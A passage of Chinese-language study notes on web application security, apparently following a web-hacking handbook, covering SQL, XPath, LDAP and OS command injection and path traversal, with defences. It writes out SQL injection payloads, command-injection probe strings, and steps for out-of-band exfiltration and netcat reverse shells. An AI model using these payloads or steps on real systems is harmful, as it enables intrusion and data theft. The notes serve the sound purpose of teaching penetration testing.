<li>对于安全性很高的功能，考虑对操作进行双重验证，进一步确认该功能举动被未授权方使用；</li>
<li>记录每一个访问敏感数据或执行敏感操作的事件，以便后续检测并调查潜在的非法访问事件；</li>
</ul>
<h3 id="多层权限模型"><a href="#多层权限模型" class="headerlink" title="多层权限模型"></a>多层权限模型</h3><p>除了对应用程序实施良好的访问控制实践，也应将这些实践或思路使用到基础设施中，例如：应用程序服务器、数据库、操作系统等；</p>
<ul>
<li>数据库应增加多个账户，有些账户只有查询的权限，供应用程序中仅需查询的功能使用；</li>
<li>应在数据库中增加一个权限表，对数据库中不同的数据库表执行严格的访问控制；</li>
<li>只给每个操作系统账户分配最低权限，仅能运行所需的组件即可；</li>
</ul>
<p>对于需要复杂权限的应用程序，应该设计一张权限矩阵表，进行清晰化的控制，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195257.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="常见的访问控制概念"><a href="#常见的访问控制概念" class="headerlink" title="常见的访问控制概念"></a>常见的访问控制概念</h4><ul>
<li>编程控制：将数据库权限矩阵保存在一个数据库表中，并以编程的形式做出访问控制决定；</li>
<li>自主访问控制：由管理员分配资源权限给其他用户，分配规则可以是封装式（白名单），也可以是开放式的（黑名单）</li>
<li>基于角色的访问控制：创建很多命名的角色，给用户分配角色；使用角色对用户的请求进行检查；</li>
<li>声明式控制：应用程序使用有限的数据库账户访问数据库，每个账户仅分配到执行所允许操作的最低权限；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-45"><a href="#渗透测试步骤-45" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><p>虽然使用多层控制模型的应用程序可以避免很多常见的访问控制漏洞，但是仍然有一些潜在的漏洞</p>
<ul>
<li>应用程序的源代码有可能容易受到注入类的攻击；</li>
<li>角色定义不全面或不完整；</li>
<li>低权限的操作系统账户仍然可以访问敏感数据；</li>
<li>应用程序服务器软件本身存在漏洞；</li>
<li>某个小漏洞可能成为实现权限大提升的突破点；</li>
</ul>
</blockquote>
<h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>许多时候，突破访问控制非常容易；有时在一些高度安全的应用中则很难；“四处看看”是攻击访问控制的最有效方法，如果能够耐心的测试应用程序的每一项功能，也许不久就可以发现一个能攻破整个应用程序的漏洞；</p>
<h1 id="9-攻击数据存储区"><a href="#9-攻击数据存储区" class="headerlink" title="9. 攻击数据存储区"></a>9. 攻击数据存储区</h1><h2 id="注入解释型语言"><a href="#注入解释型语言" class="headerlink" title="注入解释型语言"></a>注入解释型语言</h2><p>如果使用普通用户登录进行查询，然后使用数据库语言进行注入攻击，有可能直接绕开应用程序的访问控制检查；</p>
<blockquote>
<h4 id="渗透测试步骤-46"><a href="#渗透测试步骤-46" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>提交可能在解释型语言中引发问题的无效语法；</li>
<li>检查应用程序的响应，看是否存在代码注入漏洞的反常现象；</li>
<li>如果收到错误消息，从中获取服务端发生某种问题的证据；</li>
<li>系统性的修改初始输入，尝试确定或否定之前的漏洞假设；</li>
<li>构造一个漏洞验证框架，以可证实的方式执行某些安全的命令，收集证据，检查是否存在漏洞；</li>
<li>利用目标语言和组件的功能来实现攻击，对其中已公开的漏洞加以利用；</li>
</ul>
</blockquote>
<h2 id="注入-SQL"><a href="#注入-SQL" class="headerlink" title="注入 SQL"></a>注入 SQL</h2><p>如果在本地安装一个与目标应用程序相同的数据库的话，会提高注入的效率，因为很多注入命令可以先在本地数据库进行尝试，观察并结合本地数据库的返回结果，之后再去猜测目标服务器的结果会更容易理解其内部发生的情况；</p>
<h3 id="利用一个基本的漏洞"><a href="#利用一个基本的漏洞" class="headerlink" title="利用一个基本的漏洞"></a>利用一个基本的漏洞</h3><p>基本原理是利用 SQL 解释型语言动态解释 SQL 语句的特点，在查询参数中添加单引号、注释符等在 SQL 中有意义的关键符号，使得语句进入解释器后，执行不同的查询操作；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SQL"># 输入项为 &quot;Reilly&quot;<br><span class="hljs-keyword">SELECT</span> author, title, <span class="hljs-keyword">year</span>  <span class="hljs-keyword">FROM</span> books <span class="hljs-keyword">WHERE</span> publisher<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Reilly&#x27;</span> <span class="hljs-keyword">and</span> published<span class="hljs-operator">=</span><span class="hljs-number">1</span><br># 修改输入项为 Reilly<span class="hljs-string">&#x27; OR 1=1--，查询语句变成如下</span><br><span class="hljs-string">SELECT author, title, year  FROM books WHERE publisher=&#x27;</span>Reilly<span class="hljs-string">&#x27; OR 1=1--&#x27;</span> <span class="hljs-keyword">and</span> published<span class="hljs-operator">=</span><span class="hljs-number">1</span><br># 修改输入项为 Reilly<span class="hljs-string">&#x27; OR &#x27;</span>a<span class="hljs-string">&#x27; = &#x27;</span>a，查询语句变成如下<br><span class="hljs-keyword">SELECT</span> author, title, <span class="hljs-keyword">year</span>  <span class="hljs-keyword">FROM</span> books <span class="hljs-keyword">WHERE</span> publisher<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Reilly&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> published<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h3 id="注入不同的语句类型"><a href="#注入不同的语句类型" class="headerlink" title="注入不同的语句类型"></a>注入不同的语句类型</h3><h4 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h4><p>用来查询数据，一般配合 WHERE 使用；</p>
<h4 id="INSERT-语句"><a href="#INSERT-语句" class="headerlink" title="INSERT 语句"></a>INSERT 语句</h4><p>用于插入数据行，攻击可利用漏洞来为自己创建管理员账户；有时不知道插入值需要多少个参数，此时需要挨个添加（添加整数1或2000），并进行测试；</p>
<h4 id="UPDATE-语句"><a href="#UPDATE-语句" class="headerlink" title="UPDATE 语句"></a>UPDATE 语句</h4><p>用于修改表中一行或多行的数据；UPDATE 与 INSERT 很像，区别在于多了 WHRER 部分来指定待更新的行；</p>
<p>对 UPDATE 的漏洞进行探查有很大的风险，因为它很有可能一不小心就修改了数据库里面的很多数据；</p>
<h4 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h4><p>用于删除表中一行或者几行的数据；运行机制很像 UPDATE 语句，它同样也有很大的破坏当前数据库的风险；</p>
<h3 id="查明-SQL-注入漏洞"><a href="#查明-SQL-注入漏洞" class="headerlink" title="查明 SQL 注入漏洞"></a>查明 SQL 注入漏洞</h3><p>正常情况下，所有提交给服务端的参数，最终可能都会传递到数据库函数进行处理；因此，通过检查这些提交的数据项，发现可能存在的漏洞；</p>
<p>有时候应用程序会从多个请求中收集数据，待收集完整后，才会写入数据库，因此，如果有多阶段的过程，需要对该功能发送的所有数据进行遍历；如果只处理单个请求，则可能会遗漏漏洞；</p>
<h4 id="注入字符串数据"><a href="#注入字符串数据" class="headerlink" title="注入字符串数据"></a>注入字符串数据</h4><p>渗透测试步骤</p>
<ul>
<li>提交一个单引号作为目标查询的数据，观察是否会造成错误，或查询结果与原始结果不同；</li>
<li>如果发现错误或者异常行为，在提交的数据中包含两个单引号（连着，单引号的转义），看会如何反应；如果错误或异常消失，则表明很可能有注入漏洞；</li>
<li>使用 SQL 连接符，在提交的数据中增加一个等同于正常输入的字符串，来进一步核实漏洞是否存在；不同数据库软件的连接符不同：<ul>
<li>MySQL: ‘ ‘FOO  （注：两个引号之间有空格）</li>
<li>MS-SQL: ‘+’FOO</li>
<li>Oracle: ‘||’FOO</li>
</ul>
</li>
</ul>
<blockquote>
<p>可在特定的查询参数中使用 SQL 通配符 %，看是否会返回更多的结果，如果是的话，说明提交的数据正与后端数据库交互；</p>
</blockquote>
<p>在提交的输入中添加单引号后，如果服务端返回这个输入的话，会导致客户端的 js 脚本在处理它时出现报错；因为单引号在 js 里面也一个关键字符；</p>
<h4 id="注入数字数据"><a href="#注入数字数据" class="headerlink" title="注入数字数据"></a>注入数字数据</h4><p>一般情况下，当数字参数传输到服务端时，一般应用程序会将其加单引号处理，但有时候也有可能没有处理，直接发给数据库软件；</p>
<p>渗透测试步骤：</p>
<ul>
<li>尝试输入一个运算结果等于原始结果的算术表达式，例如原始值为2，则输入 3-1，或者 1+1；如果应用程序仍然能够正常反应，则存在注入漏洞；</li>
<li>如果前面的方法取得成功，则接下来可以使用更加复杂和特殊的 SQL 关键字和语法的表达式进一步探查该漏洞，例如使用 ASCII 命令来将字符或数字转成数值类型的 ASCII 码，例如 67-ASCII(A）等同于 67-65，也即等于2；</li>
<li>如果单引号被过滤掉，则前面的方法可能无效；此时可以利用数据库会解析 ASCII 命令的特点，例如：51-ASCII(1) 等于 51-49，也即等于2；</li>
</ul>
<p>在使用特殊字符探查 SQL 注入漏洞时，需要提前留意一点，即输入是需要先被 HTML 编码之后，才会传输到服务端时，因此我们还需要将字符进一步转为 HTML 编码，才能达到预期的目标；</p>
<ul>
<li>&amp; 和 &#x3D; 在 HTML 中应该以 %26 和 %3d 来表示；</li>
<li>查询字符串不允许有空格，因此空格需要使用 %20 或者 + 来表示；</li>
<li>如果要在字符串中使用 + ，则需要使用 %2b 对其编码；例如：1+1 应以 1%2b1 进行提交；</li>
<li>分号用于分隔 cookie 字段，需要使用 %3b 对其编码；</li>
</ul>
<h4 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h4><p>在 SQL 语句中，有一些关键字，例如：ORDER BY, WHERE 等，这些关键字跟着一些列名，来达到预期的目标；而这些列名在有些应用程序中是由客户端提交的数据来指定的；</p>
<p>渗透测试步骤</p>
<ul>
<li>记下任何可能控制应用程序返回的结果的顺序，或者结果的类型的参数；</li>
<li>提交一系列在参数值中使用数字值的请求，从数字1开始，然后逐个请求递增；<ul>
<li>如果更改的数字会影响结果的顺序，则说明输入很可能被用于 ORDER BY 子句中，因为在 ORDER BY 之后的数字，表示按第几列进行排序；如果数字超过了总列数，则查询会失败；在数字后面使用 ASC – 或者 DESC – 来观察返回的结果是否顺序会变化；</li>
<li>如果提交的数字 1 生成一组结果，其中有一列都包含该数字，则表示该数字被用于插入到返回的结果的某一列中；即 SELECT 1, title, year FROM books WHERE publisher&#x3D;’Willy’</li>
</ul>
</li>
</ul>
<blockquote>
<p>虽然在 ORDER BY 之后接的是列名称，因此不能再注入 UNION, WHERE, OR, AND 等关键字，但可以指定一个嵌套查询来实现注入；</p>
</blockquote>
<h3 id="“指纹”-识别数据库"><a href="#“指纹”-识别数据库" class="headerlink" title="“指纹” 识别数据库"></a>“指纹” 识别数据库</h3><p>根据数据库使用哪种连接符，可以判断其使用的哪一种数据库；将原本某个正常的字符串参数，改成由连接符连接的格式，看服务端能否正常返回结果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210194833.png" srcset="/img/loading.gif" lazyload></p>
<p>对于数字格式的参数，使用以下攻击字符串来识别，它在匹配的数字库中表示 0，在不匹配的数据库中则会出现错误；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210194951.png" srcset="/img/loading.gif" lazyload></p>
<p>MySQL 在处理行内注释时，有一个特点，当行内注释以感叹号 ！开头时，表示进行版本号的判断，如果当前数据库的版本号大于等于注释中的版本号，则注释中的内容会被解析和执行；因此可以利用这一点，插入相应的语句，来识别数据库的版本，例如：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195019.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h3><p>SQL 使用 UNION 将两个或多个的 SELECT 语句的查询结果合并起来；如果一个 SELECT 语句出现漏洞，意味着可以使用 UNION 来执行另一次完全独立的查询，并将其结果和第一次的查询结果组合到一起；</p>
<p>但是 UNION 也有一些限制：</p>
<ul>
<li>查询结果的列数需要是相同的；每列的数据类型需要是兼容的；</li>
<li>需要知道另一个表的名称和列的名称；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-47"><a href="#渗透测试步骤-47" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>先查明所需的列数；利用 NULL 被转换为任何数据类型的这一特点，逐个增加 NULL 直到查询被执行；</li>
<li>第二项任务是找到一个数据类型为字符串的列，使用 ‘a’ 逐个取代一个 NULL，如果查询得到执行，将看到另一行包含 a 值的数据，然后可以使用相关列从数据库中提取数据；</li>
</ul>
</blockquote>
<h3 id="提取有用的数据"><a href="#提取有用的数据" class="headerlink" title="提取有用的数据"></a>提取有用的数据</h3><p>想获得有用的数据，需要知道列的名称；而列的名称经常保存在数据库元数据的表中（例如 MS-SQL 中的 information_schema.columns），通过查询该表来获得表和列的名称；</p>
<h3 id="使用-UNION-提取数据"><a href="#使用-UNION-提取数据" class="headerlink" title="使用 UNION 提取数据"></a>使用 UNION 提取数据</h3><ul>
<li>使用 NULL 找到列数；</li>
<li>查找元数据表，得到表名称和列名称；</li>
<li>开始提取数据</li>
</ul>
<h3 id="避开过滤"><a href="#避开过滤" class="headerlink" title="避开过滤"></a>避开过滤</h3><h4 id="避免使用被阻止的字符"><a href="#避免使用被阻止的字符" class="headerlink" title="避免使用被阻止的字符"></a>避免使用被阻止的字符</h4><ul>
<li>使用 SQL 的内置函数来动态构建字符串，</li>
<li>如果注释符号被净化，可以设计为真的表达式；</li>
</ul>
<h4 id="避免使用简单确认"><a href="#避免使用简单确认" class="headerlink" title="避免使用简单确认"></a>避免使用简单确认</h4><p>有时候应用程序使用黑名单来净化，则是可以将注入的数据用复杂一些的表达式，例如：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195046.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="使用-SQL-注释"><a href="#使用-SQL-注释" class="headerlink" title="使用 SQL 注释"></a>使用 SQL 注释</h4><p>SQL 允许在行内插入注释，这意味着可以利用这个特性来避开净化，或者冒充空格；</p>
<h4 id="利用有缺陷的过滤"><a href="#利用有缺陷的过滤" class="headerlink" title="利用有缺陷的过滤"></a>利用有缺陷的过滤</h4><p>应用程序有可能没有使用递归的方式来过滤，因此可以增加一个外层骗过它；</p>
<h3 id="二阶-SQL-注入"><a href="#二阶-SQL-注入" class="headerlink" title="二阶 SQL 注入"></a>二阶 SQL 注入</h3><p>有些应用程序允许用户的输入项中包含特殊的字符，当输入到达服务端时，应用程序会对其进行转义，这会导致注入失去效果；但是此时存在一些微妙的问题，存入数据库的特殊字符被转义了，但当下次它被查询并取出来的时候，有可能没有适当处理，然后可能再次帮为参数参加其他的 SQL 查询，此时将触发一个漏洞；</p>
<p>原理：将 SQL 注入语句先做为正常值存起来，然后再调用查询的命令将把它取出来，从而触发注入；</p>
<h3 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h3><p>有些攻击者不一定使用注入来获取数据，它甚至有时候用来破坏数据库；</p>
<h4 id="获取数字数据"><a href="#获取数字数据" class="headerlink" title="获取数字数据"></a>获取数字数据</h4><p>可利用 ASCII 和 SUBSTRING 两个函数将字符转成数字；这样如果想得到一串数字，可以用字符串转化并拼接出来；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195105.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="使用带外通道"><a href="#使用带外通道" class="headerlink" title="使用带外通道"></a>使用带外通道</h4><p>虽然有时候可以实现注入查询，但是查询的结果却不一定被应用程序返回给浏览器，但是可以利用数据库的内置功能，让它与攻击者设立的目标数据库建立连接，将查询结果传输到攻击者创建的数据库；</p>
<ul>
<li>MS-SQL 的 openrowset 功能；</li>
<li>Oracle 的各种包，包括 UTL_HTTP 、UTL_INADDR、UTL_SMTP、UTL_TCP；</li>
<li>MySQL 的 INTO OUTFIL 命令可以将结果写入一个文件，通过在两台计算之间建立 SMB 共享，可以实现文件的匿名写入；</li>
</ul>
<p>另外通过提升数据库权限，还可以利用操作系统的功能来和外部建立连接以传送数据；</p>
<h4 id="使用推论：条件式响应"><a href="#使用推论：条件式响应" class="headerlink" title="使用推论：条件式响应"></a>使用推论：条件式响应</h4><p>由于防火墙的关系，有时候带外通道并一定能够成功；此时还有另外一种比较费劲的办法，即通过设置不同的查询条件，应用程序会出现不一样的行业，来判断自己所猜测的信息是否是命中了；例如让数据库报错，此时应用程序有可能会返回 500 的错误，从而得到反馈；</p>
<p>SELECT X FROM Y WHERE C，当条件 C 满足时，才会求 X 表达式的值，如果 C 不满足，则不会触发 X 表达式的计算；此时，我们可以设置 X 表达式为一个求值会报错的表达式，例如进行除零云计算，这样我们就可以在 C 中放置我们想探查的信息，如果查询成功，就会触发报错；如果查询失败，则不会触发报错；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195128.png" srcset="/img/loading.gif" lazyload></p>
<p>我们可以逐个字节的探查猜测是否正确，例如对于字符串类型的用户名，我们可以探查第一个字母是否为 A，如果不是就看是否为 B，以此类推；当猜测出来后，再开始探查第二个字母，不断循环；使用这种方法可以探查数据库中的每一条记录；</p>
<h4 id="使用时间延迟"><a href="#使用时间延迟" class="headerlink" title="使用时间延迟"></a>使用时间延迟</h4><p>猜测的依据除了建立在应用程序是否报错的基础上，也可以建立在应用程序的响应时间上；例如不同数据库有内置不同的延迟命令，可以调取这个命令来制造时间延迟；有些数据库没有时间延迟函数，这时可以让它作一次密集运算，或者让它连接一个不存在的服务器来增加延迟；</p>
<h4 id="SQL-注入之外：扩大数据库攻击范围"><a href="#SQL-注入之外：扩大数据库攻击范围" class="headerlink" title="SQL 注入之外：扩大数据库攻击范围"></a>SQL 注入之外：扩大数据库攻击范围</h4><p>除了应用程序外，数据库本身也是存在漏洞的；因此，除了攻击应用程序本身，还可以通过攻击数据库服务器来达到相同的目的；</p>
<h5 id="MS-SQL"><a href="#MS-SQL" class="headerlink" title="MS-SQL"></a>MS-SQL</h5><p>MS-SQL 有一个内置的 xp__cmdshell 功能，可以使用数据库账户执行系统级的命令，中，虽然默认情况下，该功能是关闭的，但是如果应用程序的账户拥有足够大的权限，则它可以通过开启这项功能，然后利用它来完全控制数据库服务器的操作系统；</p>
<h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><p>Oracle 的漏洞更多，只要通过实现 SQL 注入，就大概率可以利用其漏洞控制整个数据库；</p>
<h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><p>与前面两个数据库相比，MySQL 中可用攻击者利用的内置功能相对比较少；MySQL 允许读取或写入文件到文件系统中；因此如果数据库账户拥有 FILE_PRIV 权限，则可以打开相关文件访问数据库中的任何数据；</p>
<p>另外 MySQL 允许用户打开动态库文件，因此攻击者可提前创建一个能够实现自己目的的二进制文件，然后通过 MySQL 去读取它，间接实现命令的执行；</p>
<h3 id="使用-SQL-注入工具"><a href="#使用-SQL-注入工具" class="headerlink" title="使用 SQL 注入工具"></a>使用 SQL 注入工具</h3><p>探测 SQL 注入漏洞的过程需要提交大量的请求，目前已经有这方面的自动化工具，但这些工具还没有达到智能化的程度，在使用前，需要攻击者做一些设置，才能够更有效的提高攻击效率和成功率；</p>
<h3 id="SQL-语法与错误参考"><a href="#SQL-语法与错误参考" class="headerlink" title="SQL 语法与错误参考"></a>SQL 语法与错误参考</h3><h4 id="SQL-语法"><a href="#SQL-语法" class="headerlink" title="SQL 语法"></a>SQL 语法</h4><p>不同的数据库语法之间有一些差别，因此需要因地制宜，使用匹配后端数据库的语法；</p>
<h4 id="SQL-错误消息"><a href="#SQL-错误消息" class="headerlink" title="SQL 错误消息"></a>SQL 错误消息</h4><p>不同的数据库其报错的消息格式和内容也不一样，并且这些报错消息意味着不同的漏洞可能性；</p>
<h3 id="防止-SQL-注入"><a href="#防止-SQL-注入" class="headerlink" title="防止 SQL 注入"></a>防止 SQL 注入</h3><h4 id="部分有效的防御措施"><a href="#部分有效的防御措施" class="headerlink" title="部分有效的防御措施"></a>部分有效的防御措施</h4><ul>
<li>对用户输入的所有单引号进行配对；</li>
<li>使用存储过程；</li>
</ul>
<h4 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h4><ul>
<li>指定查询结构，预留占位符；</li>
<li>指定每个占位符的内容；</li>
</ul>
<h4 id="深层防御"><a href="#深层防御" class="headerlink" title="深层防御"></a>深层防御</h4><ul>
<li>当应用程序访问数据库时，应尽量采用最低权限的账户；</li>
<li>尽量删除或禁用数据库的那些不必要的功能；内置功能越强大越多，漏洞也越多；</li>
<li>及时安装数据库软件的补丁；</li>
</ul>
<h2 id="注入-NoSQL"><a href="#注入-NoSQL" class="headerlink" title="注入 NoSQL"></a>注入 NoSQL</h2><p>NoSQL 虽然是非关系型数据库的统称，但是其实涵盖很多种类型的数据库，每一种数据库的使用方式都完全不同，因此针对不同的 NoSQL 数据库需要使用不同的攻击方法；</p>
<blockquote>
<p>作者在写作这本书的时候，这方面的研究才刚开始，但现在这个阶段估计应该有一些成功的办法了；</p>
</blockquote>
<h2 id="注入-XPath"><a href="#注入-XPath" class="headerlink" title="注入 XPath"></a>注入 XPath</h2><p>XPath 是一个处理 XML 文档的工具，用来从 XML 文档中读取或写入数据；但是 XML 并不是保存应用程序数据的传统方式，它一般用来保存一些配置类型的数据为主，或一些简单的信息，例如角色、权限等；</p>
<p>XPath 注入的方式跟 SQL 差不多，例如都同样可以使用条件判断逐个字节的获得信息；XPath 同样也有一些内置的函数可供利用；</p>
<p>有时候我们并不知道后面是否使用 XPath，但如果发现某个 SQL 漏洞，但却无法加以利用，则应考虑一下 XPath 的可能；</p>
<h2 id="注入-LDAP"><a href="#注入-LDAP" class="headerlink" title="注入 LDAP"></a>注入 LDAP</h2><p>LDAP 是 lightweight directory access protocol 的简称，表示轻量级的访问协议，它用来提供访问网络中的目录；</p>
<p>LDAP 使用一些逻辑运算符来做条件判断；由于它独特的语法形式，常规的 SQL 注入技巧在 LDAP 并不适用；通常来说， LDAP 的注入难度更大一些；不过如果结合其语法来提交输入，也是存在注入的可能； </p>
<p>LDAP 在处理 NULL 字节方面存在漏洞，该单词在 LDAP 表示字符串终止；攻击者可以利用这个漏洞，达到和 SQL 的注释符相同的效果；</p>
<h2 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h2><p>本章提到的攻击方式只是注入攻击的冰山一角，如果攻击者利用这类漏洞，将能够在服务器的操作系统上执行命令、检查任意文件，即利用应用程序的漏洞攻破并控制为应用程序提供环境的组件；</p>
<h1 id="10-攻击后端组件"><a href="#10-攻击后端组件" class="headerlink" title="10. 攻击后端组件"></a>10. 攻击后端组件</h1><p>一般来说，很多 Web 应用程序被作为后端服务的中间层，客户端通过访问这个中间层，间接实现对服务器上其他底层组件（例如文件系统）和进程的访问；虽然 Web 应用程序本身设置了安全机制，但是对于应用程序来说安全的数据，有可能对于底层组件来说并不是安全的。攻击者有可能利用该漏洞，绕过应用程序的检查，实现对底层组件的调用和控制；</p>
<h2 id="注入操作系统命令"><a href="#注入操作系统命令" class="headerlink" title="注入操作系统命令"></a>注入操作系统命令</h2><p>有些应用程序会基于用户的输入，生成相应的命令，发送给操作系统执行，这将可能被攻击者利用的漏洞，因为可以设计专门的输入，修改开发者想要执行的命令；这类漏洞特别经常出现在为内部人员提供管理服务器的界面的应用程序中，因为这类管理需求需要直接跟操作系统打交道；</p>
<p>有些命令使用的是字符串拼接的方式，然后发给脚本语言本身提供的系统调用函数来执行；有些脚本语言使用 eval 函数将字符串解析为待执行的代码；</p>
<h3 id="查找-OS-命令注入漏洞"><a href="#查找-OS-命令注入漏洞" class="headerlink" title="查找 OS 命令注入漏洞"></a>查找 OS 命令注入漏洞</h3><p>不同的 shell 解释器有不同的字符处理方式，应用程序调用的 shell 有很多种可能性，因此需要先想方法对假设进行验证；</p>
<p>可在原命令中注入新命令的字符：</p>
<ul>
<li>;  |  &amp; 等三个字符可用于将几个命令连接起来；而且在不同的 shell 解释器中，成对使用它们可达到不同的效果；</li>
<li>反引号 &#96; 可用于将一个独立的命令包含在最初命令处理的数据中；例如把一个注入命令放在反引号中，shell 就会先执行该命令，然后用执行的结果代替被反引号包含的文本，然后执行替代后的新命令字符串；</li>
</ul>
<blockquote>
<p>注入命令的一个常见问题是执行的结果并不会返回，因此并不知道注入是否成功，但是只要漏洞存在，就会有一些探查的方法，例如通过时间延迟来判断；</p>
</blockquote>
<p>渗透测试步骤</p>
<ul>
<li>通过 ping 及其时间参数，让操作系统在接下来的一段时间访问本地的回环接口（即 127.0.0.1）来制作延迟；</li>
<li>如果发生时间延迟，则说明漏洞有可能存在；接下来可以通过命令选项 -i 或 -n 逐渐递增间隔或次数，观察延迟的时间是否跟着增加；如果是的话，说明漏洞很大可能存在，同时也可以排除延迟是因为网络造成的；</li>
<li>使用可成功实施攻击的注入字符串，尝试注入更有用的命令（例如 ls 或 dir），看是否能够将命令结果返回到浏览器上；</li>
<li>如果无法将结果返回给浏览器，则可以尝试建立带外通道<ul>
<li>例如使用 TFTP 将工具上传到服务器，使用 telnet 或 netcat 建立一个和自己的计算相连接的反向 shell，然后使用 mail 命令通过 SMTP 发送命令执行结果；</li>
<li>可以将命令的结果重定向的某个可以公开访问的静态资源文件夹，然后通过浏览器访问它；</li>
</ul>
</li>
<li>一量找到注入命令的方法并能够获得命令执行结果，接下来应当确定自己的权限（例如使用 whoami 命令，或者尝试给某个写保护的文件夹写入一个无害的文件）；确定权限后，就设法提升自己的权限，或者借由该服务器攻击其他主机；</li>
</ul>
<p>有时候应用程序会过滤掉某些符号和字符，导致无法注入独立的系统命令；尽管如此，攻击者仍然有机会破坏开发者设定的命令行为；例如通过故意提供错误的输入，让命令报错，并将错误重定向到某个可执行文件中；而攻击者提供的错误输入，可能故意夹杂着可执行代码；随后通过浏览器访问可执行文件，执行混入的代码；</p>
<ul>
<li>&lt; 和 &gt; 两个符号可以用来重定向，当不能执行独立的命令时，如果这两个符号可用，则可以利用它们来读取或写入任意的文件内容；</li>
<li>操作系统的命令通常支持大量的参数，参数之间同样使用空格间隔；如果应用程序基于用户的输入来生成这些参数，则可以通过在参数中混入空格，然后提供额外的参数，实现攻击效果，例如利用 -O 参数将内容写入任意的文件；</li>
</ul>
<blockquote>
<p>有时应用程序会过滤空格，此时可以通过调用包含空格符字段的环境变量 $IFS 来实现空格的效果；</p>
</blockquote>
<h3 id="查找动态执行漏洞"><a href="#查找动态执行漏洞" class="headerlink" title="查找动态执行漏洞"></a>查找动态执行漏洞</h3><p>动态执行漏洞常见于 PHP 和 Perl 等语言；但绝大多数应用程序平台都可能向基于脚本的解释器传送用户提供的输入；</p>
<p>渗透测试步骤</p>
<ul>
<li>理论上用户提供的任何数据都可以提交给动态执行函数；其中最常见的数据项是是cookie 名称和参数值；</li>
<li>尝试轮流向目标参数提交下列值，观察它们的返回结果<ul>
<li>;echo%20111111</li>
<li>echo%20111111</li>
<li>response.write%20111111</li>
<li>:response.write%20111111</li>
</ul>
</li>
<li>如果字符串 111111 被单独返回，说明该字符串前面没有其他字符串，因此该处可能存在注入漏洞；</li>
<li>如果字符串 111111 未被返回，说明存在其他字符串，此时应寻找输入被动态执行的错误消息；根据需要对语法进行调整，以实现注入任意的命令；</li>
<li>如果攻击的应用程序是 PHP，可以使用测试字符串 phpinfo()；如果它被成功执行，会返回 PHP 的配置信息；</li>
<li>如果应用程序可能存在注入漏洞，则同样可以通过制造延迟的方法来确认漏洞的存在，例如：system(‘ping%20127.0.0.1’)</li>
</ul>
<h3 id="防止-OS-命令注入"><a href="#防止-OS-命令注入" class="headerlink" title="防止  OS 命令注入"></a>防止  OS 命令注入</h3><p>防止 OS 命令注入的最好办法是一劳永逸的避免在程序中直接调用操作系统的命令，而是改由调用内置的 API 来实现；如果实在无法做到，则应该对用户的输入进行严格的控制，例如增加一份白名单，限制长度，并只需要字母和数字，不得包含任何的符号；</p>
<p>应用程序应尽量使用内置的 API 的名称和参数来启动目标进程，而不是直接向 shell 解释器传递命令字符串，这样可以利用内置 API 的检查机制来增加额外的保护；</p>
<h3 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h3><p>最佳方法是避免将任何用户提供的输入，直接传给任何动态执行函数；如果无法做到，则应该建立严格的白名单；</p>
<h2 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h2><p>有些 Web 应用程序提供某个功能，该功能支持接受用户输入的一个文件名或者路径名，然后应用程序调用系统的 API 查找或读取该文件或目录；如果没有对用户提交的输入进行严格的检查，就有可能存在注入的漏洞；</p>
<h3 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h3><p>有些 Web 应用程序根据客户端提交的文件名，通过拼接路径的方式，读取并返回服务器上存储的静态文件（或者是将数据写入到服务器上面）；攻击者可以在文件名参数中加入 .. （点点）符号，来遍历整个文件树，读取甚至修改一些敏感信息，从而获得整个服务器的控制权；</p>
<p>虽然这种漏洞形式被广泛应用，常见的 Web 应用框架会采取一些防御措施，例如对客户端的输入进行过滤；但是这仍然无法阻止技术熟练的攻击者。</p>
